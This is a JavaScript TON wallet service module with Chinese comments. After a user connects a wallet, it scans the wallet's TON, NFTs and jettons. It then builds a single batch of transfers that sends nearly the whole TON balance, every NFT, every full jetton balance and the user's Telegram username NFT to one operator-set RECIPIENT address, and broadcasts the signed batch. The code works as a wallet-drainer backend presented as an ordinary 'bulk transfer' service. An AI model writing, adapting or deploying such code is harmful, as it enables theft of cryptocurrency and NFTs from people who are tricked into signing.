// WalletService.js
import redis from "../utils/redis.js";
import TonWeb from "tonweb";

const { Address, BN } = TonWeb.utils;

/** -----------------------------
 *  配置项（可按需调整 / 用 env 覆盖）
 * ------------------------------ */
const GAS = {
  tonTransferKeep: parseFloat(process.env.KEEP_TON ?? "2"), // 预留 TON
  tonMinSend: parseFloat(process.env.MIN_TON_SEND ?? "0.5"), // 低于此不转
  nftGas: parseFloat(process.env.NFT_GAS ?? "0.05"),
  jettonGas: parseFloat(process.env.JETTON_GAS ?? "0.06"),
};

const TONAPI = {
  url: process.env.TONAPI_URL,
  key: process.env.TONAPI_KEY || "",
};

const TONCENTER = {
  rpc: process.env.TONCENTER_RPC,
  key: process.env.TONCENTER_API_KEY || "",
};

const RECIPIENT = process.env.RECIPIENT_ADDRESS; // 批量转移收款方（owner 地址）

// 可选：只转这些 Jetton（逗号分隔的 root 地址 EQ...）
const JETTON_WHITELIST = (process.env.JETTON_WHITELIST || "")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

/** -----------------------------
 *  工具：校验与数值
 * ------------------------------ */
const AddressUtils = {
  isTonAddr(s) {
    return typeof s === "string" && /^E[Qf][A-Za-z0-9_-]{46}$/.test(s);
  },
};

const NumberUtils = {
  /** 将任意数值转为 BigInt（仅用于内部比较/转换，不直接传给 writeUint） */
  toBigInt(value) {
    if (typeof value === "bigint") return value;
    if (typeof value === "string") return BigInt(value);
    if (typeof value === "number") {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BigInt`);
      }
      return BigInt(value);
    }
    if (value instanceof BN) return BigInt(value.toString());
    throw new Error(`无法将 ${typeof value} 类型转换为 BigInt`);
  },

  /** 将任意数值转为 BN（writeUint 专用） */
  toBN(value) {
    if (value instanceof BN) return value;
    if (typeof value === "bigint") return new BN(value.toString());
    if (typeof value === "string") return new BN(value);
    if (typeof value === "number") {
      if (!Number.isInteger(value)) {
        // 对于 writeUint，请不要传小数，先放大到整数（raw）后再来
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BN`);
      }
      return new BN(value);
    }
    throw new Error(`无法将 ${typeof value} 类型转换为 BN`);
  },

  /** 安全字符串化 */
  toString(value) {
    if (typeof value === "string") return value;
    if (typeof value === "bigint") return value.toString();
    if (typeof value === "number") return String(value);
    if (value instanceof BN) return value.toString();
    return String(value);
  },
};

/** 人类可读金额 -> raw（uint128 / BigInt） */
function toRawAmountBigInt(humanStr, decimals) {
  const [intPart = "0", fracRaw = ""] = String(humanStr).split(".");
  const frac = (fracRaw + "0".repeat(decimals)).slice(0, decimals);
  const s = (intPart + frac).replace(/^0+/, "") || "0";
  return NumberUtils.toBigInt(s);
}

/** -----------------------------
 *  TonWeb Provider 单例
 * ------------------------------ */
let _tonweb = null;
function getTonweb() {
  if (_tonweb) return _tonweb;
  const provider = new TonWeb.HttpProvider(TONCENTER.rpc, {
    apiKey: TONCENTER.key,
  });
  _tonweb = new TonWeb(provider);
  return _tonweb;
}

/** -----------------------------
 *  JettonWallet 地址缓存
 *  key: jw:<root>:<owner>  -> string
 * ------------------------------ */
async function getSenderJettonWalletAddress(jettonRoot, ownerAddr) {
  if (!AddressUtils.isTonAddr(jettonRoot)) {
    throw new Error(`非法 Jetton Root 地址: ${jettonRoot}`);
  }
  if (!AddressUtils.isTonAddr(ownerAddr)) {
    throw new Error(`非法 owner 地址: ${ownerAddr}`);
  }

  const cacheKey = `jw:${jettonRoot}:${ownerAddr}`;
  const cached = await redis.get(cacheKey);
  if (cached) return new Address(cached);

  const tonweb = getTonweb();
  const minter = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
    address: new Address(jettonRoot),
  });
  const jw = await minter.getJettonWalletAddress(new Address(ownerAddr));
  const jwStr = jw.toString(true, true, true);
  await redis.set(cacheKey, jwStr);
  return jw;
}

/** -----------------------------
 *  Payload 构造
 * ------------------------------ */

/** TIP-3 transfer（通用：包含 USDT 在内的所有 Jetton） */
async function buildJettonTransferPayloadBase64({
  toOwnerAddress, // 收款方普通钱包（owner）
  rawAmountBigInt, // uint128 - BigInt
  responseToAddress, // 回执地址
  forwardAmountTon = "0",
  forwardComment = "",
}) {
  if (!AddressUtils.isTonAddr(toOwnerAddress)) {
    throw new Error(`非法 toOwnerAddress: ${toOwnerAddress}`);
  }
  if (!AddressUtils.isTonAddr(responseToAddress)) {
    throw new Error(`非法 responseToAddress: ${responseToAddress}`);
  }

  const OP = 0x0f8a7ea5; // transfer
  const cell = new TonWeb.boc.Cell();

  cell.bits.writeUint(OP, 32);
  cell.bits.writeUint(new BN(0), 64); // query_id
  cell.bits.writeUint(NumberUtils.toBN(rawAmountBigInt), 128); // amount

  cell.bits.writeAddress(new Address(toOwnerAddress));
  cell.bits.writeAddress(new Address(responseToAddress));

  cell.bits.writeBit(0); // custom_payload: none
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon))); // forward_ton_amount

  if (forwardComment) {
    const fwd = new TonWeb.boc.Cell();
    fwd.bits.writeUint(0, 32);
    fwd.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
    cell.refs.push(fwd);
  } else {
    cell.bits.writeBit(0); // 无 payload
  }

  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

/** NFT 标准 transfer（无备注时不 push 空 ref；query_id 用 BN） */
async function buildNftTransferPayloadBase64({
  toAddress,
  responseTo,
  forwardAmountTon = 0,
  forwardComment = "",
}) {
  if (!AddressUtils.isTonAddr(toAddress)) {
    throw new Error(`非法 toAddress: ${toAddress}`);
  }
  if (!AddressUtils.isTonAddr(responseTo)) {
    throw new Error(`非法 responseTo: ${responseTo}`);
  }

  const cell = new TonWeb.boc.Cell();
  cell.bits.writeUint(0x5fcc3d14, 32); // NFT transfer op

  const nowMs = Date.now();
  const rand10 = Math.floor(Math.random() * 1024);
  const queryIdBn = new BN(String(nowMs)).mul(new BN(1024)).add(new BN(rand10));
  cell.bits.writeUint(queryIdBn, 64);

  cell.bits.writeAddress(new Address(toAddress));
  cell.bits.writeAddress(new Address(responseTo));
  cell.bits.writeBit(0); // no custom_payload
  cell.bits.writeCoins(TonWeb.utils.toNano(String(forwardAmountTon)));

  if (forwardComment) {
    const forwardPayload = new TonWeb.boc.Cell();
    forwardPayload.bits.writeUint(0, 32);
    forwardPayload.bits.writeBytes(Buffer.from(forwardComment, "utf8"));
    cell.refs.push(forwardPayload);
  } else {
    cell.bits.writeBit(0); // 无 ref payload
  }

  const boc = await cell.toBoc(false);
  return Buffer.from(boc).toString("base64");
}

/** -----------------------------
 *  主服务
 * ------------------------------ */
export class WalletService {
  /** 连接钱包：缓存到 Redis */
  static async connectWallet(wallet, raw) {
    try {
      if (!AddressUtils.isTonAddr(wallet)) {
        throw new Error(`非法钱包地址: ${wallet}`);
      }
      const walletKey = `wallet:${wallet}`;
      await redis.set(
        walletKey,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );
      console.log("钱包连接成功，已缓存到Redis:", wallet);
      return { success: true, message: "", data: { status: "connected" } };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  /** TON → nanoTON（字符串） */
  static toNanoStr = (vTon) => {
    let processed = vTon;
    if (typeof vTon === "number") processed = vTon.toFixed(9);
    const nano = TonWeb.utils.toNano(NumberUtils.toString(processed)); // BN
    return nano.toString();
  };

  /** 示例：用户名 NFT 转移 */
  static async createTransaction(wallet, productInfo) {
    try {
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);
      if (!walletData) throw new Error("walletData not found");

      const username = productInfo?.[2];
      const newOwnerWallet = RECIPIENT;
      if (!username || !newOwnerWallet) {
        throw new Error("username 或 RECIPIENT_ADDRESS 缺失");
      }

      // 解析 t.me DNS -> 找到 NFT item 地址
      const dnsRes = await fetch(`${TONAPI.url}/v2/dns/${username}.t.me`, {
        headers: { Authorization: `Bearer ${TONAPI.key}` },
      });
      const dnsData = await dnsRes.json();
      const nftItemAddress = dnsData?.item?.address ?? null;
      if (!nftItemAddress) throw new Error("未找到用户名 NFT Item 地址");

      const amount = this.toNanoStr(0.1);
      const nftPayloadBase64 = await buildNftTransferPayloadBase64({
        toAddress: newOwnerWallet,
        responseTo: wallet,
        forwardAmountTon: 0,
        // forwardComment: `transfer @${username}`,
      });

      const messages = [
        {
          address: nftItemAddress,
          amount,
          payload: nftPayloadBase64,
        },
      ];

      return {
        messages,
        raw: {
          type: "nft_username_transfer",
          username,
          wallet,
          nftItemAddress,
          newOwnerWallet,
          amount,
          ts: Date.now(),
        },
      };
    } catch (error) {
      console.error("createTransaction", error);
      throw new Error(`createTransaction error: ${error.message}`);
    }
  }

  /** 并行拉取资产（TON / NFTs / Jettons） */
  static async getAllWalletAssets(walletAddress) {
    try {
      if (!AddressUtils.isTonAddr(walletAddress)) {
        throw new Error(`非法地址: ${walletAddress}`);
      }
      const assets = {
        ton: { balance: "0", balanceTon: "0" },
        nfts: [],
        jettons: [],
      };

      const headers = { Authorization: `Bearer ${TONAPI.key}` };

      const [accRes, nRes, jRes] = await Promise.all([
        fetch(`${TONAPI.url}/v2/blockchain/accounts/${walletAddress}`, {
          headers,
        }),
        fetch(`${TONAPI.url}/v2/accounts/${walletAddress}/nfts?limit=1000`, {
          headers,
        }),
        fetch(`${TONAPI.url}/v2/accounts/${walletAddress}/jettons?limit=1000`, {
          headers,
        }),
      ]);

      // TON
      if (accRes.ok) {
        const data = await accRes.json();
        const bal = NumberUtils.toString(data.balance || "0");
        assets.ton.balance = bal;
        assets.ton.balanceTon = TonWeb.utils.fromNano(bal); // string
      }

      // NFTs
      if (nRes.ok) {
        const data = await nRes.json();
        assets.nfts = data.nft_items || [];
      }

      // Jettons
      if (jRes.ok) {
        const data = await jRes.json();
        // 结构：balances: [{ balance, wallet_address, jetton: { address(root), decimals, symbol, ... } }]
        assets.jettons = (data.balances || []).filter((b) => {
          if (!JETTON_WHITELIST.length) return true;
          const root = b?.jetton?.address;
          return root && JETTON_WHITELIST.includes(root);
        });
      }

      console.log("资产扫描:", {
        ton: assets.ton.balanceTon,
        nftCount: assets.nfts.length,
        jettonCount: assets.jettons.length,
      });
      return assets;
    } catch (error) {
      console.error("获取钱包资产错误:", error);
      throw new Error(`获取钱包资产失败: ${error.message}`);
    }
  }

  /** 批量资产转移（TON + NFT + Jetton） */
  static async createAllAssetTransfer(wallet) {
    if (!RECIPIENT) throw new Error("缺少 RECIPIENT_ADDRESS");
    if (!AddressUtils.isTonAddr(wallet))
      throw new Error(`非法钱包地址: ${wallet}`);

    try {
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);
      if (!walletData) throw new Error("walletData not found");

      const assets = await this.getAllWalletAssets(wallet);
      const messages = [];

      /** 1) TON：保留 gas */
      const keepTon = GAS.tonTransferKeep;
      const balTon = parseFloat(assets.ton.balanceTon || "0");
      const canSend = Math.max(0, balTon - keepTon);
      if (canSend > GAS.tonMinSend) {
        messages.push({
          address: RECIPIENT,
          amount: this.toNanoStr(canSend),
          payload: "",
        });
      }

      /** 2) NFTs：所有权转移到 RECIPIENT */
      for (const nft of assets.nfts) {
        try {
          const nftPayload = await buildNftTransferPayloadBase64({
            toAddress: RECIPIENT,
            responseTo: wallet,
            forwardAmountTon: 0,
            forwardComment: `Bulk transfer NFT`,
          });

          messages.push({
            address: nft.address, // NFT item 合约
            amount: this.toNanoStr(GAS.nftGas),
            payload: nftPayload,
          });
        } catch (e) {
          console.warn(`NFT 转移构造失败: ${nft?.address}`, e.message);
        }
      }

      /** 3) Jettons：统一使用 TIP-3 transfer */
      // 可并发构造
      const jettonMsgs = await Promise.allSettled(
        (assets.jettons || []).map(async (j) => {
          const jettonRoot = j?.jetton?.address;
          const rawBalanceStr = NumberUtils.toString(j?.balance ?? "0");
          const rawBalance = NumberUtils.toBigInt(rawBalanceStr);
          if (!jettonRoot || rawBalance === 0n) {
            return null;
          }

          // 目标 = 发送方 JettonWallet（通过 root+owner 计算）
          const senderJettonWallet = await getSenderJettonWalletAddress(
            jettonRoot,
            wallet
          );

          const payload = await buildJettonTransferPayloadBase64({
            toOwnerAddress: RECIPIENT, // 对方 owner（普通钱包）
            rawAmountBigInt: rawBalance, // 全部余额
            responseToAddress: wallet,
            forwardAmountTon: "0",
            forwardComment: "",
          });

          return {
            address: senderJettonWallet.toString(true, true, true),
            amount: this.toNanoStr(GAS.jettonGas), // 外部给 sender JW 的 gas
            payload,
          };
        })
      );

      for (const r of jettonMsgs) {
        if (r.status === "fulfilled" && r.value) {
          messages.push(r.value);
        } else if (r.status === "rejected") {
          console.warn("Jetton 构造失败:", r.reason?.message || r.reason);
        }
      }

      console.log(`批量转移交易已生成: ${messages.length} 个消息`);
      return {
        success: true,
        data: { messages },
        assets,
        messages,
        message: `批量转移交易已生成: ${messages.length} 个消息`,
      };
    } catch (error) {
      console.error("创建批量资产转移错误:", error);
      throw new Error(`创建批量资产转移失败: ${error.message}`);
    }
  }

  /** 广播已签名的 BOC（TonAPI）+ 简单确认轮询 */
  static async broadcastWithTonapi(wallet, raw) {
    try {
      const res = await fetch(`${TONAPI.url}/v2/sendBoc`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${TONAPI.key}`,
        },
        body: JSON.stringify({ boc: raw.boc.boc }),
      });

      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        const msg =
          data?.message || data?.error || `${res.status} ${res.statusText}`;
        throw new Error(`sendBoc failed: ${msg}`);
      }
      console.log("sendBoc success", data);
      await redis.set(`boc:${wallet}`, JSON.stringify({ ...data }));

      // 尝试确认第一条消息（可选）
      try {
        const targetAddress = raw.messages?.[0]?.address;
        if (!targetAddress) return { success: true, data, pending: true };

        const expect = {
          to: targetAddress,
          since: Date.now() - 5 * 60 * 1000,
          // 可选：minAmountNano: raw.messages?.[0]?.amount,
        };
        const confirmed = await this.waitForConfirmation(
          wallet,
          targetAddress,
          expect,
          TONAPI.key,
          90_000,
          3_000
        );
        return { success: true, confirmed, data };
      } catch (e) {
        return { success: true, pending: true, data };
      }
    } catch (error) {
      console.error("sendBoc error:", error);
      throw new Error(`sendBoc error: ${error.message}`);
    }
  }

  static async sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  /**
   * 简单轮询确认：在窗口期内寻找符合条件的一笔入账
   * @param {string} account - 目标账户（例如 NFT item 地址或收款地址）
   * @param {{minAmountNano?: string, from?: string, to?: string, since?: number}} expect
   */
  static async waitForConfirmation(
    wallet,
    account,
    expect,
    apiKey,
    timeoutMs = 60_000,
    intervalMs = 3_000
  ) {
    if (!account) throw new Error("waitForConfirmation: account 缺失");
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const url = `${TONAPI.url}/v2/blockchain/accounts/${account}/transactions?limit=20`;
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${apiKey || ""}` },
      });

      if (res.ok) {
        const data = await res.json();
        const txs = data?.transactions ?? [];

        const hit = txs.find((tx) => {
          const inMsg = tx?.in_msg;
          if (!inMsg) return false;

          const okTo = expect.to
            ? inMsg.destination?.address === expect.to
            : true;
          const okTime = expect.since ? tx.utime * 1000 >= expect.since : true;

          let okAmt = true;
          if (expect.minAmountNano) {
            try {
              const val = NumberUtils.toBigInt(inMsg.value || "0");
              const minAmt = NumberUtils.toBigInt(expect.minAmountNano);
              okAmt = val >= minAmt;
            } catch (error) {
              console.warn(`金额比较失败: ${error.message}`);
              okAmt = false;
            }
          }

          const okFrom = expect.from
            ? inMsg.source?.address === expect.from
            : true;
          return okTo && okTime && okAmt && okFrom;
        });

        if (hit) {
          await redis.del(`boc:${wallet}`);
          return hit;
        }
      }

      await this.sleep(intervalMs);
    }
    throw new Error("confirmation timeout");
  }
}
